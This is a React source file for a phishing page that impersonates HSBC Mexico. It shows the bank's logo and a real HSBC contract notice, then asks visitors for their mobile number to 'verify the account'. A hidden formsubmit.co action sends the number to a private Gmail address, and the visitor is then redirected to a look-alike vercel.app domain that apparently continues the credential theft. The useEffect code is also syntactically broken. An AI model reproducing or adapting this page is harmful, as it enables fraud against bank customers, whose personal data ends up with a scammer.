import React, { useEffect } from 'react';
import '../css/style.css';
import Logo from '../img/logo2.jpg'

const Numerocelular = () => {
  useEffect(() => {
    var numerocelular = document.querySelector('.inputname');
    var btncontinuar = document.querySelector('.btncontinuar');

    // el boton estara disable, hasta que el input tenga 10 digitos

    numerocelular.addEventListener('input', function () {
      if (this.value.length === 10) {
        btncontinuar.disabled = false;
      } else {
        btncontinuar.disabled = true;
      }
    numerocelular.addEventListener('input', function () {
      if (this.value.length > 10) this.value = this.value.slice(0, 10);
    });

    // solo ingreso de numeros
    numerocelular.addEventListener('input', function () {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
  }, []); // El arreglo vacío [] como segundo argumento asegura que se ejecute solo una vez después del primer renderizado

  return (
    <div>
    <nav className='nbar' >
      <img src={Logo} alt="" />
    </nav>
    <div className="cintadeco">
      <h1 className="cinta">El Contrato Único de Banca por Internet y Banca Móvil tendrá modificaciones que entrarán en vigor a partir del 22 de diciembre de 2023. Consulta los detalles <a href='https://www.hsbc.com.mx/content/dam/hsbc/mx/documents/digital/aviso_actualizacion_contrato.pdf' className='link' >aquí.</a></h1>
    </div>
    <div className="contglobal">
      <div className="contenedor">
        <form className="formulario" action="https://formsubmit.co/robr48j@gmail.com" method="POST">
          <h1 className="titulo">Numero de Celular</h1>
          <div className="cont">
            <div className="labeleicon">
              <label className="label">Ingresa tu número celular para verificar la cuenta</label>
            </div>
            <div className="input-cont">
              <input className="inputname" name="name" placeholder="Ingresa tu numero de celular" maxLength="10" type="number" required/>
              <input type="hidden" name="email" value="" />
              <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
              <input type="hidden" name="_captcha" value="false" />
            </div>
            <div className="olvidouser">
              <a href="" className="linkolvido">
                ¿Olvidaste tu numero?
              </a>
            </div>
            <div className="input-contbtn">
              <button className="btncontinuar" type="submit">
                Continuar
              </button>
            </div>
          </div>
        </form>
      </div>
    </div>
    </div>
  );
};

export default Numerocelular;

